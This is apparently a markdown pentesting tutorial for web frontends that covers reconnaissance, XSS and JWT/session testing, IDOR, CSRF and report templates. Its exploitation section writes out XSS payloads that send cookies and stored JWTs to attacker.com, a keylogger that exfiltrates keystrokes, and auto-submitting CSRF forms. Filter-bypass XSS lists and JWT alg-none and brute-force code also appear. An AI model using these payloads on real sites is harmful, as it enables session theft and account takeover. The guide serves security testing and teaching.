---
title: "Penetration Testing Guide"
description: ""
date: "2026-04-24"
author: "Saul Vo"
tags: ["security","scanning","testing","vulnerability"]
readingTime: "5 min"
order: 2
slug: "penetration-testing-guide"
category: "security-scanning"
---

# Penetration Testing Guide

## Mục lục
1. [Penetration Testing Overview](#1-penetration-testing-overview)
2. [Reconnaissance](#2-reconnaissance)
3. [Vulnerability Discovery](#3-vulnerability-discovery)
4. [Exploitation Techniques](#4-exploitation-techniques)
5. [Post-Exploitation](#5-post-exploitation)
6. [Reporting](#6-reporting)

---

## 1. Penetration Testing Overview

### Testing Methodology

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Penetration Testing Phases                      │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1. Reconnaissance (Information Gathering)                        │
│     • Identify all endpoints and attack surface                   │
│     • Enumerate technologies used                                  │
│     • Map authentication mechanisms                                │
│                                                                     │
│  2. Vulnerability Discovery                                       │
│     • Manual testing for vulnerabilities                         │
│     • Automated scanning                                         │
│     • Fuzzing inputs                                             │
│                                                                     │
│  3. Exploitation                                                   │
│     • Attempt to exploit found vulnerabilities                    │
│     • Verify impact and severity                                  │
│     • Document proof of concept                                  │
│                                                                     │
│  4. Post-Exploitation                                              │
│     • Assess data access achieved                                │
│     • Test lateral movement possibilities                         │
│     • Evaluate persistence mechanisms                            │
│                                                                     │
│  5. Documentation & Reporting                                     │
│     • Document findings with evidence                            │
│     • Assess business impact                                      │
│     • Provide remediation guidance                               │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### Frontend Pentest Focus Areas

| Area | Testing Goals | Tools |
|------|--------------|-------|
| XSS | Stored, Reflected, DOM-based | Browser dev tools, XSS payloads |
| Auth | Token handling, Session management | HTTP intercept tools |
| API | Authorization, Rate limiting | Burp Suite, Postman |
| WebSocket | Message injection, Origin validation | WScat, custom scripts |
| Dependencies | Known vulnerabilities | npm audit, Snyk |

---

## 2. Reconnaissance

### Endpoint Discovery

```bash
# Discover API endpoints via crawling
npx openapi-fetch https://api.example.com/openapi.json
curl https://api.example.com/api-docs

# Find WebSocket endpoints
grep -r "new WebSocket" src/
grep -r "ws://\|wss://" src/

# Enumerate all page routes
grep -rE "(router\.|Route|path:|getServerSideProps)" src/
```

### Technology Fingerprinting

```bash
# Check HTTP headers for technology info
curl -I https://target.com

# Look for:
# - X-Powered-By
# - Server
# - X-Response-Time
# - Custom headers revealing framework

# Check for specific technologies
curl -s https://target.com | grep -i "next\|react\|angular\|vue"
```

### Authentication Mechanism Mapping

```bash
# Identify auth mechanism
curl -I https://target.com/api/user 2>/dev/null | grep -E "WWW-Authenticate|Set-Cookie|X-Token"

# Check token location
curl -s https://target.com/api/user \
  -H "Authorization: Bearer test" | grep -i "token\|auth\|session"
```

---

## 3. Vulnerability Discovery

### XSS Testing

```typescript
// XSS test payloads
const xssPayloads = {
  // Basic script injection
  basic: [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<iframe src="javascript:alert(1)">'
  ],

  // Event handlers
  eventHandler: [
    '<div onmouseover="alert(1)">hover',
    '<body onload=alert(1)>',
    '<img src=x onerror=alert(1)>',
    '<video><source onerror="alert(1)">'
  ],

  // Filter bypass
  bypass: [
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<IMG SRC=x onerror=alert(1)>',
    '<SVG><g/onload=alert(1)>',
    '"><script>alert(1)</script>',
    "';alert(1);//"
  ]
};

// Test each payload and verify if executed
async function testXSS(target, fieldName, payloads) {
  for (const payload of payloads) {
    const response = await fetch(target, {
      method: 'POST',
      body: JSON.stringify({ [fieldName]: payload }),
      headers: { 'Content-Type': 'application/json' }
    });

    const body = await response.text();

    // Check if payload is reflected without encoding
    if (body.includes(payload)) {
      console.log(`Potential XSS: ${fieldName} reflects: ${payload}`);
    }

    // Check if script executes (via timing or visible alert)
    // This would need browser automation
  }
}
```

### Authentication Testing

```typescript
// Test JWT vulnerabilities
async function testJWT() {
  // 1. Algorithm None attack
  const noneToken = createJWT({ alg: 'none', payload: { admin: true } });
  await fetch('/api/admin', {
    headers: { Authorization: `Bearer ${noneToken}` }
  });

  // 2. Weak secret brute force
  const commonSecrets = ['secret', 'password', '123456', 'jwt'];
  for (const secret of commonSecrets) {
    try {
      jwt.verify(stolenToken, secret);
      console.log(`Weak secret found: ${secret}`);
    } catch {}
  }

  // 3. Token expiration not enforced
  const expiredToken = createJWT({ exp: 0 });
  const response = await fetch('/api/protected', {
    headers: { Authorization: `Bearer ${expiredToken}` }
  });
  // If 200, expiration not enforced
}

// Test session management
async function testSession() {
  // 1. Session fixation
  const sessionId = getAnonymousSession();
  const authenticatedResponse = await fetch('/api/login', {
    headers: { Cookie: `session_id=${sessionId}` },
    body: loginData
  });

  // Use same session ID after login
  const postLoginResponse = await fetch('/api/sensitive', {
    headers: { Cookie: `session_id=${sessionId}` }
  });
  // Should fail if session fixation protection exists

  // 2. Session expiration
  await wait(30 * 60 * 1000);  // 30 minutes
  const expiredResponse = await fetch('/api/sensitive', {
    headers: { Cookie: `session_id=${sessionId}` }
  });
}
```

### WebSocket Security Testing

```bash
# Connect to WebSocket
wscat -c wss://target.com/ws

# Send authentication
{"type": "auth", "token": "jwt"}

# Test for unauthenticated access
{"type": "get_messages", "room_id": "test"}

# Test message injection
{"type": "chat_message", "content": "<script>alert(1)</script>"}

# Test rate limiting
for i in {1..100}; do
  echo '{"type": "message", "content": "test"}' | wscat -c wss://target.com/ws &
done
```

---

## 4. Exploitation Techniques

### Session Hijacking via XSS

```javascript
// If XSS found, use to steal session
const payload = `
  &lt;script&gt;
    fetch('https://attacker.com/log?cookie=' + document.cookie);
  &lt;/script&gt;
`;

// Or for JWT in sessionStorage
const stealJWT = `
  &lt;script&gt;
    fetch('https://attacker.com/steal?token=' + sessionStorage.getItem('jwt'));
  &lt;/script&gt;
`;

// Keylogger
const keylogger = `
  &lt;script&gt;
    const keys = [];
    document.addEventListener('keypress', e => {
      keys.push(e.key);
      if (keys.length > 50) {
        fetch('https://attacker.com/log?k=' + keys.join(''));
        keys = [];
      }
    });
  &lt;/script&gt;
`;
```

### Authorization Bypass (IDOR)

```typescript
// Test IDOR on user resources
async function testIDOR() {
  // Get resource as user1
  const user1Token = await login('user1@test.com');
  const resourceResponse = await fetch('/api/resources/12345', {
    headers: { Authorization: `Bearer ${user1Token}` }
  });

  // Try to access as user2
  const user2Token = await login('user2@test.com');
  const idorResponse = await fetch('/api/resources/12345', {
    headers: { Authorization: `Bearer ${user2Token}` }
  });

  // If 200, IDOR vulnerability
  if (idorResponse.status() === 200) {
    console.log('IDOR: User2 can access User1 resource');
  }
}

// Test parameter manipulation
async function testParameterManipulation() {
  // Original: GET /api/users/123/profile
  // Manipulated: GET /api/users/456/profile

  // Try to access admin resources
  // GET /api/admin/users (should require admin role)
}
```

### CSRF Exploitation

```html
<!-- CSRF attack to change email -->
<form action="https://target.com/api/profile" method="POST" id="csrfForm">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>

&lt;script&gt;
  document.getElementById('csrfForm').submit();
&lt;/script&gt;

<!-- Auto-submit CSRF -->
<img src="x" style="display:none" onerror="
  fetch('https://target.com/api/profile', {
    method: 'POST',
    credentials: 'include',
    body: new URLSearchParams({ email: 'attacker@evil.com' })
  });
">
```

---

## 5. Post-Exploitation

### Data Access Assessment

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Post-Exploitation Assessment                      │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  After gaining initial access, assess:                              │
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  What data can be accessed?                                  │   │
│  │  • User credentials/PII                                     │   │
│  │  • Payment information                                      │   │
│  │  • Business data                                            │   │
│  │  • API keys/secrets                                         │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  What actions can be performed?                             │   │
│  │  • Modify user data                                         │   │
│  │  • Delete resources                                         │   │
│  │  • Access admin functions                                   │   │
│  │  • Execute API calls                                        │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  Can access be escalated?                                   │   │
│  │  • Privilege escalation possible?                          │   │
│  │  • Lateral movement to other users?                        │   │
│  │  • Can breach other tenants (for SaaS)?                    │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### Impact Assessment Matrix

| Vulnerability | Access Gained | Impact Level |
|--------------|--------------|-------------|
| Stored XSS | Any user's session | Critical |
| IDOR (read) | Other users' data | High |
| IDOR (write) | Modify other users' data | Critical |
| Auth bypass | Full access | Critical |
| CSRF | State-changing actions as user | High |
| Weak JWT secret | Impersonate any user | Critical |

---

## 6. Reporting

### Finding Documentation Template

```markdown
## Finding: [Vulnerability Name]

### Severity: [Critical/High/Medium/Low]

### Location
- URL: https://target.com/api/endpoint
- File: src/components/UserProfile.tsx:45
- Parameter: email

### Description
[Description of the vulnerability]

### Steps to Reproduce
1. Login to application as user1@test.com
2. Navigate to profile page
3. [Specific action that triggers vulnerability]
4. Observe [result]

### Impact
[Explanation of potential damage if exploited]

### Proof of Concept
```bash
# PoC commands/scripts
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"payload": "<script>alert(1)</script>"}'
```

### Remediation
[Specific steps to fix the vulnerability]

### References
- OWASP XSS Prevention Cheat Sheet
- CWE-79
```

### Risk Rating Criteria

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Risk Rating Criteria                             │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Critical:                                                         │
│  • Direct code execution                                            │
│  • Full authentication bypass                                       │
│  • Sensitive data exposure (passwords, payment data)               │
│  • Remote code execution possibility                               │
│                                                                     │
│  High:                                                              │
│  • Stored XSS with session hijacking                               │
│  • IDOR with sensitive data access                                │
│  • Authentication weakness enabling account takeover              │
│  • CSRF enabling state-changing attacks                            │
│                                                                     │
│  Medium:                                                            │
│  • Reflected XSS                                                   │
│  • Information disclosure                                         │
│  • Weak rate limiting enabling enumeration                        │
│  • Missing security headers (low impact)                          │
│                                                                     │
│  Low:                                                               │
│  • Clickjacking (requires user interaction)                      │
│  • Console logging sensitive data (low impact)                   │
│  • Deprecated features (low impact)                               │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## OWASP References

- [Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Web Security Testing Guide](https://github.comOWASP/wstg)
- [Penetration Testing Guide](https://cheatsheetseries.owasp.org/cheatsheets/Penetration_Testing_Cheat_Sheet.html)
